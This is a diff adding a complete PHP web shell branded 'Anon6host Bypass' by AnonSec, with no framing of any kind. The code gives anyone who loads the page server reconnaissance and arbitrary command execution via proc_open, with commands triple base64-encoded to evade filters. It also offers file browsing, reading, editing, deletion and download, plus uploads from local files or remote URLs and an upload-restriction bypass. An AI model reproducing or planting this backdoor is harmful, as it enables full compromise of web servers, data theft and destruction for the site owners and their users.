+<font face="Bungee" size="5">Anon6host Bypass<br>https://anon6host.my.if</font></center>
+<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>
+<?php
+//@set_time_limit(0);
+//@error_reporting(0);
+//@http_response_code(404);
+
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+$disfunc = @ini_get("disable_functions");
+if (empty($disfunc)) {
+    $disf = "<font color='gold'>NONE</font>";
+} else {
+    $disf = "<font color='red'>".$disfunc."</font>";
+}
+
+function author() {
+    echo "<center><br>AnonSec - 2021</center>";
+    exit();
+}
+
+function cekdir() {
+    if (isset($_GET['path'])) {
+        $lokasi = $_GET['path'];
+    } else {
+        $lokasi = getcwd();
+    }
+    if (is_writable($lokasi)) {
+        return "<font color='green'>Writeable</font>";
+    } else {
+        return "<font color='red'>Writeable</font>";
+    }
+}
+
+function cekroot() {
+    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
+        return "<font color='green'>Writeable</font>";
+    } else {
+        return "<font color='red'>Writeable</font>";
+    }
+}
+
+function xrmdir($dir) {
+    $items = scandir($dir);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $path = $dir.'/'.$item;
+        if (is_dir($path)) {
+            xrmdir($path);
+        } else {
+            unlink($path);
+        }
+    }
+    rmdir($dir);
+}
+
+function dunlut($file) {
+    if (!is_readable($file)) {
+        red("Cannot Download File / Unreadable File !");
+        die();
+    }
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($filepath));
+    flush();
+    readfile($file);
+    die();
+}
+
+function owner($file) {
+    if (function_exists("posix_getpwuid")) {
+        $tod = @posix_getpwuid(fileowner($file));
+        return "<center>".$tod['name']."</center>";
+    } else {
+        return "<center>".fileowner($file)."</center>";
+    }
+}
+
+function cekwrite($lokasi) {
+    $izin = substr(sprintf('%o', fileperms($lokasi)), -4);
+    if (is_writable($lokasi)) {
+        return "<font color=green>".$izin."</font>";
+    } else {
+        return "<font color=red>".$izin."</font>";
+    }
+}
+
+function ekse($komend, $lokasi) {
+    if (!function_exists("proc_open")) {
+        die("proc_open function disabled !");
+    } elseif (!function_exists("base64_decode")) {
+        die("base64_decode function disabled !");
+    }
+    $komen = base64_decode(base64_decode(base64_decode($komend)));
+    if (strpos($komend, "2>&1") === false) {
+        $komen = base64_decode(base64_decode(base64_decode($komend)))." 2>&1";
+    }
+    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
+    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>";
+}
+
+function ipserv() {
+    if (empty($_SERVER['SERVER_ADDR'])) {
+        return gethostbyname($_SERVER['SERVER_NAME']);
+        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
+            return $_SERVER['SERVER_NAME'];
+        }
+    } else {
+        return $_SERVER['SERVER_ADDR'];
+    }
+}
+
+function cekfile($file) {
+     return '<i class="fa fa-file" style="color: #d6d4ce"></i> ';
+}
+
+function filedate($file) {
+    return date("F d Y g:i:s", filemtime($file));
+}
+
+function unzip($file, $lokasi) {
+    if (!is_readable($file)) {
+        red("Cannot Unzip File / Unreadable File !");
+        die();
+    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
+        red("This isn't Zip File !");
+        die();
+    }
+    $zip = new ZipArchive;
+    $res = $zip -> open($file);
+    if ($res == true) {
+        $zip -> extractTo($lokasi);
+        $zip -> close();
+        green("Success Unzip File !");
+    } else {
+        red("Failed to Unzip File !");
+    }
+}
+
+function green($text) {
+    echo "<center><font color='green'>".$text."</center></font>";
+}
+
+function red($text) {
+    echo "<center><font color='red'>".$text."</center></font>";
+}
+
+echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
+echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
+echo "System : <font color='gold'>".php_uname()."</font><br>";
+echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
+echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
+echo "Disable Function : ".$disf."</font><br>";
+echo "MySQL : ";
+if (function_exists("mysql_connect")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; cURL : ";
+if (function_exists("curl_init")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; WGET : ";
+if (file_exists("/usr/bin/wget")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; Perl : ";
+if (file_exists("/usr/bin/perl")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; Python : ";
+if (file_exists("/usr/bin/python2")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+
+foreach($_POST as $key => $value){
+    $_POST[$key] = stripslashes($value);
+}
+
+if(isset($_GET['path'])){
+    $lokasi = $_GET['path'];
+    $lokdua = $_GET['path'];
+} else {
+    $lokasi = getcwd();
+    $lokdua = getcwd();
+}
+
+$lokasi = str_replace('\\','/',$lokasi);
+$lokasis = explode('/',$lokasi);
+$lokasinya = @scandir($lokasi);
+
+echo "<br>Directory (".cekwrite($lokasi).") : &nbsp;";
+
+foreach($lokasis as $id => $lok){
+    if($lok == '' && $id == 0){
+        $a = true;
+        echo '<a href="?path=/">/</a>';
+        continue;
+    }
+    if($lok == '') continue;
+    echo '<a href="?path=';
+    for($i=0;$i<=$id;$i++){
+    echo "$lokasis[$i]";
+    if($i != $id) echo "/";
+} 
+echo '">'.$lok.'</a>/';
+}
+
+echo '</td></tr><tr><td>';
+if (isset($_POST['upwkwk'])) {
+    if ($_POST['dirnya'] == "2") {
+            $lokasi = $_SERVER['DOCUMENT_ROOT'];
+        }
+    if (isset($_POST['berkasnya'])) {
+        $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
+        if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
+            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
+        } else {
+            echo "<font color='red'>Failed to Upload !<br><br>";
+        }
+    } elseif (isset($_POST['linknya'])) {
+        if (empty($_POST['namalink'])) {
+            exit("Filename cannot be empty !");
+        }
+        if ($_POST['dirnya'] == "2") {
+            $lokasi = $_SERVER['DOCUMENT_ROOT'];
+        }
+        $data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
+        if (file_exists($lokasi."/".$_POST['namalink'])) {
+            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
+        } else {
+            echo "<font coloe='red'>Failed to Upload !<br><br>";
+        }
+    } elseif (isset($_POST['bepas'])) {
+        $bepasdata = $_POST['bepasdata'];
+        $bepasnama = $_POST['bepasnama'];
+        if ($bepasdata) {
+            echo "string";
+        }
+        @file_put_contents($lokasi."/".$bepasnama, $bepasdata);
+        if (file_exists($lokasi."/".$bepasnama)) {
+            echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$bepasnama."</i></font><br><br>";
+        } else {
+            echo "<font coloe='red'>Failed to Upload !<br><br>";
+        }
+    }
+}
+
+echo "</table><br>";
+echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">';
+echo '<th>[ &nbsp;<a href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; ]</th>';
+echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=gaskan">C0mmand</a>&nbsp; ]</th>';
+echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&upload=gaskan">Upload File</a>&nbsp; ]</th>';
+echo "</table><br>";
+
+if (isset($_GET['fileloc'])) {
+    echo "<tr><td>Current File : ".$_GET['fileloc'];
+    echo '</tr></td></table><br/>';
+    echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
+    author();
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
+    if (is_dir($_POST['path'])) {
+        xrmdir($_POST['path']);
+        if (file_exists($_POST['path'])) {
+            red("Failed to delete Directory !");
+        } else {
+            green("Delete Directory Success !");
+        }
+    } elseif (is_file($_POST['path'])) {
+        @unlink($_POST['path']);
+        if (file_exists($_POST['path'])) {
+            red("Failed to Delete File !");
+        } else {
+            green("Delete File <i>".basename($_POST['path'])."</i> Success !");
+        }
+    }
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
+    if (isset($_POST['gantin'])) {
+        $ren = @rename($_POST['path'], $_POST['newname']);
+        if ($ren == true) {
+            green("Change Name Success !");
+        } else {
+            red("Change Name Failed !");
+        }
+    }
+    if (empty($_POST['name'])) {
+        $namaawal = $_POST['newname'];
+    } else {
+        $namawal = $_POST['name'];
+    }
+    echo "<center>".$_POST['path']."<br>";
+    echo '<form method="post">
+    New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
+    <input type="hidden" name="path" value="'.$_POST['path'].'">
+    <input type="hidden" name="pilih" value="gantinama">
+    <input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
+    </form>';
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+    if (isset($_POST['gasedit'])) {
+        $edit = @file_put_contents($_POST['path'], $_POST['src']);
+        if ($edit == true) {
+            green("Edit File Success !");
+        } else {
+            red("Edit File Failed !");
+        }
+    }
+    echo "<center>".$_POST['path']."<br><br>";
+    echo '<form method="post">
+    <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
+    <input type="hidden" name="path" value="'.$_POST['path'].'">
+    <input type="hidden" name="pilih" value="edit">
+    <input type="submit" value="Edit File" name="gasedit" />
+    </form><br>';
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "dunlut") {
+    dunlut($_POST['path']);
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "unzip") {
+    unzip($_POST['path'], $lokasi);
+} elseif (isset($_GET['upload'])) {
+    echo "<center>Upload File : ";
+    echo '<form enctype="multipart/form-data" method="post">
+<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
+<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
+<br>
+<input type="hidden" name="upwkwk" value="aplod">
+<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br><br>
+Upload File From Link :<br>
+<input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+<br><br>403 Upload File<br>
+<input type="file" id="datanya" onchange="setfilename(this.value); loadFile(this.files[0])"/>
+<input type="hidden" name="bepasnama" id="namanya">
+<textarea style="display: none" id="bepasdata" name="bepasdata"></textarea>
+<input type="submit" name="bepas" value="Upload" class="up" style="cursor: pointer; border-color: #fff">
+</form><br><br></center>';
+} elseif (isset($_GET['komend'])) {
+    echo "<center>";
+    echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
+    '.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #1f1f1f; color: #fff">
+    <input type="submit" name="eksekomend" value=" >> " class="up" style="cursor: pointer; border-color: #fff">
+    </form><br>';
+    if (isset($_POST['eksekomend'])) {
+        ekse($_POST['komend'], $lokasi);
+    }
+    echo "</center>";
+} 
+
+if (!is_readable($lokasi)) {
+    die("<center>This directory is unreadable :(</center>");
+}
+
+echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Last Modified</center></td>
+<td><center>Owner</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
+</tr>';
+
+foreach($lokasinya as $dir){
+    if(!is_dir($lokasi."/".$dir) || $dir == '.') continue;
+    echo "<tr>
+    <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
+    <td><center>--</center></td>
+    <td><center>".filedate($lokasi."/".$dir)."</center></td>
+    <td>".owner($lokasi."/".$dir)."</td>
+    <td><center>";
+    if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
+    elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
+    echo statusnya($lokasi."/".$dir);
+    if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';
+
+    echo "</center></td>
+    <td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
+    <select name=\"pilih\">
+    <option value=\"\"></option>
+    <option value=\"hapus\">Delete</option>
+    <option value=\"gantinama\">Rename</option>
+    </select>
+    <input type=\"hidden\" name=\"type\" value=\"dir\">
+    <input type=\"hidden\" name=\"name\" value=\"$dir\">
+    <input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
+    <input type=\"submit\" class=\"gas\" value=\">\" />
+    </form></center></td>
+    </tr>";
+}
+
+echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
+foreach($lokasinya as $file) {
+    if(!is_file("$lokasi/$file")) continue;
+    $size = filesize("$lokasi/$file")/1024;
+    $size = round($size,3);
+    if($size >= 1024){
+    $size = round($size/1024,2).' MB';
+} else {
+    $size = $size.' KB';
+}
+
+echo "<tr>
+<td>".cekfile($lokasi."/".$file)."<a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
+<td><center>".$size."</center></td>
+<td><center>".filedate($lokasi."/".$file)."</center></td>
+<td>".owner($lokasi."/".$file)."</td>
+<td><center>";
+if(is_writable("$lokasi/$file")) echo '<font color="green">';
+elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
+echo statusnya("$lokasi/$file");
+if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
+echo "</center></td><td><center>
+<form method=\"post\" action=\"?pilihan&path=$lokasi\">
+<select name=\"pilih\">
+<option value=\"\"></option>
+<option value=\"hapus\">Delete</option>
+<option value=\"dunlut\">Download</option>
+<option value=\"gantinama\">Rename</option>
+<option value=\"edit\">Edit</option>";
+if (class_exists("ZipArchive")) {
+    echo "<option value=\"unzip\">Unzip</option>";
+}
+echo "</select>
+<input type=\"hidden\" name=\"type\" value=\"file\">
+<input type=\"hidden\" name=\"name\" value=\"$file\">
+<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
+<input type=\"submit\" class=\"gas\" value=\">\" />
+</form></center></td>
+</tr>";
+}
+echo '</tr></td></table></table>';
+author();
+
+function statusnya($file){
+$izin = substr(sprintf('%o', fileperms($file)), -4);
+return $izin;
+}
+?>
